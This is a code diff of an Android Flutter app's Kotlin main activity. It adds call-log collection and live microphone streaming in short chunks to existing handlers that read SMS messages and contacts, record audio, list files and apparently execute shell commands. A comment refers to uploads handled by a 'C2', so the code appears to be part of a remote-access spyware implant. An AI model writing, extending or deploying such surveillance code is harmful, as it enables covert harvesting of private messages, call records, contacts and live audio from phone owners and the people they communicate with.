@@ -3,12 +3,15 @@ package com.zeroone.theconduit // أو اسم الحزمة الخاصة بك
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.MethodChannel
+import io.flutter.plugin.common.EventChannel // For EventChannel (Live Audio)
 import android.util.Log
 import java.io.File
-import android.Manifest // Required for permissions
-import android.content.pm.PackageManager // Required for permissions
-import androidx.core.app.ActivityCompat // Required for permissions
-import androidx.core.content.ContextCompat // Required for permissions
+import java.io.FileInputStream // For Live Audio
+import java.io.IOException
+import android.Manifest
+import android.content.pm.PackageManager
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 
 // Imports for SMS
 import android.provider.Telephony
@@ -17,14 +20,20 @@ import android.database.Cursor
 // Imports for Contacts
 import android.provider.ContactsContract
 
-// Imports for Microphone
+// Imports for Call Logs
+import android.provider.CallLog
+
+// Imports for Microphone & Live Audio
 import android.media.MediaRecorder
-import java.io.IOException
-import android.os.Build // For API level checks
+import android.os.Build
+import android.os.Handler
+import android.os.Looper
+import java.util.UUID
 
 class MainActivity : FlutterActivity() {
     private val FILES_CHANNEL_NAME = "com.zeroone.theconduit/files"
-    private val NATIVE_FEATURES_CHANNEL_NAME = "com.zeroone.theconduit/native_features" // New channel
+    private val NATIVE_FEATURES_CHANNEL_NAME = "com.zeroone.theconduit/native_features"
+    private val LIVE_AUDIO_EVENT_CHANNEL_NAME = "com.zeroone.theconduit/live_audio_stream" // New EventChannel
     private val TAG = "MainActivity"
 
     private val REQUEST_CODE_PERMISSIONS = 101
@@ -32,31 +41,33 @@ class MainActivity : FlutterActivity() {
         Manifest.permission.READ_SMS,
         Manifest.permission.READ_CONTACTS,
         Manifest.permission.RECORD_AUDIO,
-        Manifest.permission.WRITE_EXTERNAL_STORAGE // For saving recordings before API 29
+        Manifest.permission.READ_CALL_LOG, // Added Call Log permission
+        Manifest.permission.WRITE_EXTERNAL_STORAGE // For saving recordings before API 29 or temporary live audio chunks
     ).apply {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            // For Android 13 and above, specific media permissions might be needed if not using scoped storage properly.
-            // add(Manifest.permission.READ_MEDIA_AUDIO)
-        } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
-            // WRITE_EXTERNAL_STORAGE is generally sufficient for older versions
+            // add(Manifest.permission.READ_MEDIA_AUDIO) // If targeting API 33+ and accessing general media audio
         }
     }.toTypedArray()
 
     private var mediaRecorder: MediaRecorder? = null
-    private var audioOutputFile: File? = null
+    private var audioOutputFile: File? = null // For fixed duration recording
+    private var liveAudioFile: File? = null // For temporary live audio chunk
+    private var liveAudioStreamHandler: LiveAudioStreamHandler? = null
+    private val liveAudioHandler = Handler(Looper.getMainLooper())
+    private var isStreamingAudio = false
+
 
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
         Log.d(TAG, "Configuring Flutter Engine and Method Channels")
 
-        // Check and request permissions if not already granted
         if (!allPermissionsGranted()) {
             ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, REQUEST_CODE_PERMISSIONS)
         }
 
         // Files Channel (existing)
-        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, FILES_CHANNEL_NAME).setMethodCallHandler {
-            call, result ->
+        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, FILES_CHANNEL_NAME).setMethodCallHandler { call, result ->
+            // ... (الكود الحالي لـ listFiles و executeShell كما هو)
             when (call.method) {
                 "listFiles" -> {
                     val path = call.argument<String>("path") ?: context.filesDir.absolutePath
@@ -151,29 +162,28 @@ class MainActivity : FlutterActivity() {
             }
         }
 
-        // Native Features Channel (New)
-        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, NATIVE_FEATURES_CHANNEL_NAME).setMethodCallHandler {
-            call, result ->
+        // Native Features Channel
+        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, NATIVE_FEATURES_CHANNEL_NAME).setMethodCallHandler { call, result ->
             when (call.method) {
-                "getSmsList" -> {
+                "getSmsList" -> { //
                     Log.d(TAG, "getSmsList called")
                     if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                         try {
                             val smsList = mutableListOf<Map<String, Any?>>()
                             val cursor: Cursor? = contentResolver.query(
                                 Telephony.Sms.CONTENT_URI,
-                                null, // Projection: null means all columns
-                                null, // Selection
-                                null, // Selection args
-                                Telephony.Sms.DEFAULT_SORT_ORDER // Sort order
+                                null, 
+                                null, 
+                                null, 
+                                Telephony.Sms.DEFAULT_SORT_ORDER 
                             )
-                            cursor?.use { // Auto-closes cursor
+                            cursor?.use { 
                                 if (it.moveToFirst()) {
                                     do {
                                         val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                                         val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                                         val dateMs = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
-                                        val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE)) // INBOX, SENT, DRAFT etc.
+                                        val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE)) 
                                         
                                         smsList.add(mapOf(
                                             "address" to address,
@@ -189,7 +199,7 @@ class MainActivity : FlutterActivity() {
                                                 else -> "unknown"
                                             }
                                         ))
-                                    } while (it.moveToNext() && smsList.size < 200) // Limit to 200 messages for performance
+                                    } while (it.moveToNext() && smsList.size < 200) 
                                 }
                             }
                             Log.d(TAG, "Returning ${smsList.size} SMS messages.")
@@ -203,7 +213,7 @@ class MainActivity : FlutterActivity() {
                         result.error("PERMISSION_DENIED", "READ_SMS permission not granted.", null)
                     }
                 }
-                "getContactsList" -> {
+                "getContactsList" -> { //
                     Log.d(TAG, "getContactsList called")
                      if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                         try {
@@ -217,7 +227,7 @@ class MainActivity : FlutterActivity() {
                                 null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                             )
                             cursor?.use {
-                                while (it.moveToNext() && contactsList.size < 500) { // Limit contacts
+                                while (it.moveToNext() && contactsList.size < 500) { 
                                     val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                                     val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                     contactsList.add(mapOf("name" to name, "number" to number))
@@ -234,7 +244,70 @@ class MainActivity : FlutterActivity() {
                         result.error("PERMISSION_DENIED", "READ_CONTACTS permission not granted.", null)
                     }
                 }
-                "recordAudio" -> {
+                "getCallLogsList" -> { // New Method
+                    Log.d(TAG, "getCallLogsList called")
+                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
+                        try {
+                            val callLogsList = mutableListOf<Map<String, Any?>>()
+                            val projection = arrayOf(
+                                CallLog.Calls.NUMBER,
+                                CallLog.Calls.TYPE,
+                                CallLog.Calls.DATE,
+                                CallLog.Calls.DURATION,
+                                CallLog.Calls.CACHED_NAME,
+                                CallLog.Calls._ID
+                            )
+                            val cursor: Cursor? = contentResolver.query(
+                                CallLog.Calls.CONTENT_URI,
+                                projection,
+                                null,
+                                null,
+                                CallLog.Calls.DEFAULT_SORT_ORDER // Recents first
+                            )
+                            cursor?.use {
+                                val numberCol = it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
+                                val typeCol = it.getColumnIndexOrThrow(CallLog.Calls.TYPE)
+                                val dateCol = it.getColumnIndexOrThrow(CallLog.Calls.DATE)
+                                val durationCol = it.getColumnIndexOrThrow(CallLog.Calls.DURATION)
+                                val nameCol = it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
+
+                                while (it.moveToNext() && callLogsList.size < 200) { // Limit results
+                                    val number = it.getString(numberCol)
+                                    val typeInt = it.getInt(typeCol)
+                                    val dateMs = it.getLong(dateCol)
+                                    val durationSec = it.getLong(durationCol)
+                                    val name = it.getString(nameCol)
+
+                                    val typeStr = when (typeInt) {
+                                        CallLog.Calls.INCOMING_TYPE -> "incoming"
+                                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
+                                        CallLog.Calls.MISSED_TYPE -> "missed"
+                                        CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
+                                        CallLog.Calls.REJECTED_TYPE -> "rejected"
+                                        CallLog.Calls.BLOCKED_TYPE -> "blocked"
+                                        else -> "unknown"
+                                    }
+                                    callLogsList.add(mapOf(
+                                        "number" to number,
+                                        "type" to typeStr,
+                                        "date" to dateMs,
+                                        "duration" to durationSec,
+                                        "name" to name
+                                    ))
+                                }
+                            }
+                            Log.d(TAG, "Returning ${callLogsList.size} call logs.")
+                            result.success(callLogsList)
+                        } catch (e: Exception) {
+                            Log.e(TAG, "Error reading call logs", e)
+                            result.error("CALL_LOG_READ_FAILED", "Failed to read call logs.", e.localizedMessage)
+                        }
+                    } else {
+                        Log.w(TAG, "READ_CALL_LOG permission not granted.")
+                        result.error("PERMISSION_DENIED", "READ_CALL_LOG permission not granted.", null)
+                    }
+                }
+                "recordAudio" -> { // Existing fixed duration recording
                     val durationSeconds = call.argument<Int>("duration_seconds") ?: 10
                     Log.d(TAG, "recordAudio called for $durationSeconds seconds")
 
@@ -242,17 +315,11 @@ class MainActivity : FlutterActivity() {
                         result.error("PERMISSION_DENIED", "RECORD_AUDIO permission not granted.", null)
                         return@setMethodCallHandler
                     }
-                    // Optional: Check for WRITE_EXTERNAL_STORAGE for older Android versions if saving to public directories
-                    // if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q && ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
-                    //     result.error("PERMISSION_DENIED", "WRITE_EXTERNAL_STORAGE permission not granted for older Android.", null)
-                    //     return@setMethodCallHandler
-                    // }
-
                     try {
                         stopRecording() // Stop any previous recording
 
-                        val outputDir = context.cacheDir // Save to cache directory
-                        audioOutputFile = File.createTempFile("recording_", ".mp4", outputDir)
+                        val outputDir = context.cacheDir 
+                        audioOutputFile = File.createTempFile("recording_", ".m4a", outputDir) // Use .m4a for AAC
 
                         mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                             MediaRecorder(context)
@@ -263,20 +330,21 @@ class MainActivity : FlutterActivity() {
                         
                         mediaRecorder?.apply {
                             setAudioSource(MediaRecorder.AudioSource.MIC)
-                            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4) // MPEG_4 container for AAC
+                            setAudioEncoder(MediaRecorder.AudioEncoder.AAC) // AAC encoder
+                            setAudioSamplingRate(16000) // Common sampling rate for voice
+                            setAudioEncodingBitRate(64000) // 64 kbps
                             setOutputFile(audioOutputFile!!.absolutePath)
                             prepare()
                             start()
                         }
                         Log.d(TAG, "Audio recording started. Output file: ${audioOutputFile!!.absolutePath}")
-
-                        // Stop recording after the specified duration
-                        // Using a Handler to post a delayed runnable is safer than Thread.sleep in Android UI context
-                        android.os.Handler(mainLooper).postDelayed({
-                            val path = stopRecording()
+                        
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            val path = stopRecording() // This also releases the recorder
                             if (path != null) {
-                                result.success(path)
+                                Log.d(TAG, "Fixed duration recording finished. Path: $path")
+                                result.success(mapOf("filePath" to path, "status" to "completed"))
                             } else {
                                 result.error("RECORDING_STOP_FAILED", "Failed to stop recording or file path is null.", null)
                             }
@@ -285,31 +353,154 @@ class MainActivity : FlutterActivity() {
                     } catch (e: IOException) {
                         Log.e(TAG, "IOException during audio recording setup", e)
                         result.error("RECORDING_IO_FAILED", "IOException: ${e.message}", e.localizedMessage)
-                         stopRecording() // Clean up
+                         stopRecording() 
                     } catch (e: IllegalStateException) {
                         Log.e(TAG, "IllegalStateException during audio recording", e)
                         result.error("RECORDING_STATE_FAILED", "IllegalStateException: ${e.message}", e.localizedMessage)
-                         stopRecording() // Clean up
+                         stopRecording() 
                     } catch (e: Exception) {
                         Log.e(TAG, "Generic error during audio recording", e)
                         result.error("RECORDING_FAILED", "Failed to record audio: ${e.message}", e.localizedMessage)
-                         stopRecording() // Clean up
+                         stopRecording() 
                     }
                 }
-                // "stopMicRecording" - If you add a manual stop command
-                // "stopMicRecording" -> {
-                //    val path = stopRecording()
-                //    if (path != null) {
-                //        result.success(path)
-                //    } else {
-                //        result.error("RECORDING_STOP_FAILED", "Failed to stop recording or file not available.", null)
-                //    }
-                // }
+                "startLiveAudioStream" -> { // New method for live audio
+                    Log.d(TAG, "startLiveAudioStream called")
+                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                        result.error("PERMISSION_DENIED", "RECORD_AUDIO permission not granted.", null)
+                        return@setMethodCallHandler
+                    }
+                    if (isStreamingAudio) {
+                        Log.w(TAG, "Live audio streaming is already active.")
+                        result.error("ALREADY_STREAMING", "Live audio streaming is already active.", null)
+                        return@setMethodCallHandler
+                    }
+                    try {
+                        val outputDir = context.cacheDir
+                        liveAudioFile = File(outputDir, "live_chunk_${UUID.randomUUID()}.m4a")
+
+                        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                            MediaRecorder(context)
+                        } else {
+                            @Suppress("DEPRECATION")
+                            MediaRecorder()
+                        }
+
+                        mediaRecorder?.apply {
+                            setAudioSource(MediaRecorder.AudioSource.MIC)
+                            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4) // MPEG_4 can contain AAC
+                            setAudioEncoder(MediaRecorder.AudioEncoder.AAC) // Standard AAC
+                            setAudioSamplingRate(16000) // Or 44100 for higher quality if needed
+                            setAudioChannels(1) // Mono
+                            setAudioEncodingBitRate(32000) // 32 kbps or 64 kbps for voice
+                            setOutputFile(liveAudioFile!!.absolutePath)
+                            setMaxDuration(1500) // Record in 1.5-second chunks (adjust as needed)
+
+                            setOnInfoListener { _, what, _ ->
+                                if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
+                                    Log.d(TAG, "Max duration reached for live audio chunk.")
+                                    processLiveAudioChunk()
+                                }
+                            }
+                            prepare()
+                            start()
+                        }
+                        isStreamingAudio = true
+                        Log.d(TAG, "Live audio streaming started. Temp chunk file: ${liveAudioFile!!.absolutePath}")
+                        result.success("Live audio streaming started.")
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error starting live audio stream", e)
+                        isStreamingAudio = false
+                        mediaRecorder?.release()
+                        mediaRecorder = null
+                        result.error("LIVE_AUDIO_START_FAILED", "Failed to start live audio: ${e.message}", null)
+                    }
+                }
+                "stopLiveAudioStream" -> { // New method
+                    Log.d(TAG, "stopLiveAudioStream called")
+                    stopLiveStreaming()
+                    result.success("Live audio streaming stopped.")
+                }
                 else -> result.notImplemented()
             }
         }
 
+        // Event Channel for Live Audio
+        liveAudioStreamHandler = LiveAudioStreamHandler(this)
+        EventChannel(flutterEngine.dartExecutor.binaryMessenger, LIVE_AUDIO_EVENT_CHANNEL_NAME).setStreamHandler(liveAudioStreamHandler)
+
+
         Log.d(TAG, "All Method Channels configured.")
+    }
+
+    private fun processLiveAudioChunk() {
+        if (!isStreamingAudio || liveAudioFile == null || mediaRecorder == null) return
+
+        Log.d(TAG, "Processing live audio chunk: ${liveAudioFile!!.path}")
+        try {
+            // Stop current recording segment
+            mediaRecorder?.apply {
+                stop()
+                reset() // Reset for next segment
+            }
+
+            // Send the recorded chunk
+            val chunkBytes = liveAudioFile!!.readBytes()
+            liveAudioStreamHandler?.sendAudioChunk(chunkBytes)
+            Log.d(TAG, "Sent audio chunk of size: ${chunkBytes.size} bytes")
+
+            // Delete the temp chunk file
+            liveAudioFile!!.delete()
+
+
+            // Prepare and start next segment if still streaming
+            if (isStreamingAudio) {
+                liveAudioFile = File(context.cacheDir, "live_chunk_${UUID.randomUUID()}.m4a")
+                mediaRecorder?.apply {
+                    setAudioSource(MediaRecorder.AudioSource.MIC)
+                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                    setAudioSamplingRate(16000)
+                    setAudioChannels(1)
+                    setAudioEncodingBitRate(32000)
+                    setOutputFile(liveAudioFile!!.absolutePath)
+                    setMaxDuration(1500) // Same duration for next chunk
+                    // setOnInfoListener is already set
+                    prepare()
+                    start()
+                }
+                Log.d(TAG, "Started next live audio chunk recording.")
+            } else {
+                mediaRecorder?.release()
+                mediaRecorder = null
+            }
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error processing live audio chunk", e)
+            // Attempt to gracefully stop if error occurs
+            stopLiveStreaming()
+        }
+    }
+
+
+    private fun stopLiveStreaming() {
+        if (isStreamingAudio) {
+            isStreamingAudio = false
+            liveAudioHandler.removeCallbacksAndMessages(null) // Remove any pending runnables
+            try {
+                mediaRecorder?.apply {
+                    stop()
+                    release()
+                }
+                Log.d(TAG, "Live audio streaming stopped and recorder released.")
+            } catch (e: IllegalStateException) {
+                Log.e(TAG, "Error stopping live media recorder", e)
+            } finally {
+                mediaRecorder = null
+                liveAudioFile?.delete() // Clean up any remaining temp file
+                liveAudioFile = null
+            }
+        }
     }
 
     private fun allPermissionsGranted() = REQUIRED_PERMISSIONS.all {
@@ -323,12 +514,12 @@ class MainActivity : FlutterActivity() {
                 Log.d(TAG, "All required permissions granted by user.")
             } else {
                 Log.w(TAG, "Not all required permissions were granted by the user.")
-                // You might want to inform the Flutter side or disable features
             }
         }
     }
 
-    private fun stopRecording(): String? {
+    // For fixed duration recording
+    private fun stopRecording(): String? { //
         var path: String? = null
         try {
             mediaRecorder?.apply {
@@ -339,19 +530,48 @@ class MainActivity : FlutterActivity() {
             Log.d(TAG, "Audio recording stopped. File: $path")
         } catch (e: IllegalStateException) {
             Log.e(TAG, "IllegalStateException on stopRecording (already stopped or not started?)", e)
-            // It might have been stopped by the timer already, or never started.
-        } catch (e: RuntimeException) { // Catch other potential runtime errors during stop/release
+        } catch (e: RuntimeException) { 
             Log.e(TAG, "RuntimeException on stopRecording", e)
         } finally {
-            mediaRecorder = null
-            // Don't delete audioOutputFile here, it needs to be returned/uploaded.
-            // The Flutter side (or C2) should manage its lifecycle after upload.
+            mediaRecorder = null // Ensure it's nullified for both fixed and live recording
+            // For fixed recording, Flutter side will manage deletion after upload.
         }
         return path
     }
 
+
     override fun onDestroy() {
-        stopRecording() // Ensure recorder is released if activity is destroyed
+        stopRecording() // Stop fixed duration recorder
+        stopLiveStreaming() // Stop live stream recorder
         super.onDestroy()
+    }
+}
+
+// EventChannel Handler for Live Audio
+class LiveAudioStreamHandler(private val activity: MainActivity) : EventChannel.StreamHandler {
+    private var eventSink: EventChannel.EventSink? = null
+    private val TAG = "LiveAudioStreamHandler"
+
+    override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
+        eventSink = events
+        Log.d(TAG, "LiveAudioStreamHandler: onListen called")
+    }
+
+    override fun onCancel(arguments: Any?) {
+        eventSink = null
+        Log.d(TAG, "LiveAudioStreamHandler: onCancel called")
+        // Optionally, tell MainActivity to stop streaming if Flutter cancels
+        // activity.stopLiveStreaming() // Consider the implications of this
+    }
+
+    fun sendAudioChunk(chunk: ByteArray) {
+        Handler(Looper.getMainLooper()).post {
+            eventSink?.success(chunk)
+        }
+    }
+     fun sendError(errorCode: String, errorMessage: String, errorDetails: Any?) {
+        Handler(Looper.getMainLooper()).post {
+            eventSink?.error(errorCode, errorMessage, errorDetails)
+        }
     }
 }
